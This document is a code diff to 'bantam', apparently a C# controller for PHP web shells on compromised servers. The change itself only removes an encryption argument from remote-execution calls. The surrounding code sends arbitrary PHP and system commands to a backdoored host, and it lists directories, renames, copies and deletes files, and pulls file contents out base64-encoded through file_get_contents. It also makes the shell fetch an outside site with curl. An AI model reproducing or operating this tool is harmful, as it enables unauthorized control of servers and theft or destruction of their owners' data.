@@ -109,7 +109,7 @@ namespace bantam
         public static async void executePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int responseEncryptionMode, RichTextBox richTextBox = null, string prependText = "")
         {
             //todo this doesn't have a timeout
-            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(url, phpCode, encryptResponse));
+            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(url, phpCode));
 
             if (string.IsNullOrEmpty(response.Result) == false) {
                 string result = response.Result;
@@ -159,7 +159,7 @@ namespace bantam
                     return;
                 }
 
-                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.InitShellData(encryptResponse), encryptResponse);
+                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.InitShellData(encryptResponse));
 
                 //todo add to global config delay
                 if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
@@ -231,9 +231,7 @@ namespace bantam
 
             if (encryptResponse) {
                 code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, "/* Pass output buffer to $result for the encryption response to work */\r\n@ob_start();\r\n/* Code start */\r\n\r\n/* Code end */\r\n$result = @ob_get_contents();\r\n@ob_end_clean();", ref checkBoxChecked);
-            }
-            else
-            {
+            } else {
                 code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
             }
 
@@ -241,7 +239,7 @@ namespace bantam
                 if (checkBoxChecked) {
                     executePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, responseEncryptionMode);
                 } else {
-                    await WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
+                    await WebHelper.ExecuteRemotePHP(shellUrl, code);
                 }
             }
         }
@@ -256,7 +254,7 @@ namespace bantam
         /// <param name="rtb"></param>
         private async void executeMassEval(string shellUrl, string code, bool encryptResponse, int responseEncryptionMode, bool showResponse, RichTextBox rtb)
         {
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, code);
 
             if (string.IsNullOrEmpty(response.Result) == false) {
                 string result = response.Result;
@@ -325,7 +323,7 @@ namespace bantam
             }
 
             string phpCode = PhpHelper.ReadFileFromVar(PhpHelper.phpServerScriptFileName, encryptResponse);
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
             if (string.IsNullOrEmpty(response.Result)) {
                 //todo level 3 logging
@@ -367,7 +365,7 @@ namespace bantam
 
                 //todo test this when shell has gone away
                 string phpCode = PhpHelper.PhpTestExecutionWithEcho1(encryptResponse);
-                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
                 if (string.IsNullOrEmpty(response.Result)) {
                     //todo level 3 logging
@@ -405,7 +403,7 @@ namespace bantam
             bool encryptResponse = Shells[shellUrl].responseEncryption;
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.PhpInfo(encryptResponse), encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.PhpInfo(encryptResponse));
 
             if (string.IsNullOrEmpty(response.Result) == false) {
                 string result = response.Result;
@@ -852,7 +850,7 @@ namespace bantam
             }
 
             string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(txtBoxFileBrowserPath.Text, phpVersion, encryptResponse);
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
             Shells[shellUrl].files.Nodes.Clear();
 
@@ -971,7 +969,7 @@ namespace bantam
                 txtBoxFileBrowserPath.Text = string.Empty;
 
                 string phpCode = PhpHelper.GetHardDriveLettersPhp(encryptResponse);
-                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
                 if (string.IsNullOrEmpty(response.Result)) {
                     //todo level 3 logging
@@ -1001,7 +999,7 @@ namespace bantam
                 string phpVersion = Shells[shellUrl].PHP_Version;
 
                 string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(".", phpVersion, encryptResponse);
-                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
+                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
                 if (!string.IsNullOrEmpty(response.Result)) {
                     string result = response.Result;
@@ -1052,7 +1050,7 @@ namespace bantam
             }
 
             string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
             Shells[shellUrl].files.Nodes.Clear();
 
@@ -1115,7 +1113,7 @@ namespace bantam
                     }
 
                     string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
-                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
+                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
                     if (string.IsNullOrEmpty(response.Result) == false) {
                         string result = response.Result;
@@ -1278,7 +1276,7 @@ namespace bantam
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
             }
         }
 
@@ -1303,7 +1301,7 @@ namespace bantam
 
             if (dialogResult == DialogResult.Yes) {
                 string phpCode = "@unlink('" + path + "');";
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
             }
         }
 
@@ -1326,7 +1324,7 @@ namespace bantam
 
             if (!string.IsNullOrEmpty(newFileName)) {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
             }
         }
 
@@ -1385,7 +1383,7 @@ namespace bantam
             string cmd = textBoxConsoleInput.Text;
             string phpCode = PhpHelper.ExecuteSystemCode(textBoxConsoleInput.Text, encryptResponse);
 
-            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse));
+            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(shellUrl, phpCode));
 
             if (string.IsNullOrEmpty(response.Result) == false) {
                 string result = response.Result;
@@ -1430,7 +1428,7 @@ namespace bantam
                 if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
                     //todo move phpcode
                     string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
-                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
                     if (string.IsNullOrEmpty(response.Result) == false) {
                         string result = response.Result;
@@ -1732,7 +1730,7 @@ namespace bantam
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             string phpCode = PhpHelper.getBasicCurl("http://boards.4chan.org/hc/", encryptResponse);
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
             if (string.IsNullOrEmpty(response.Result) == false) {
                 string result = response.Result;
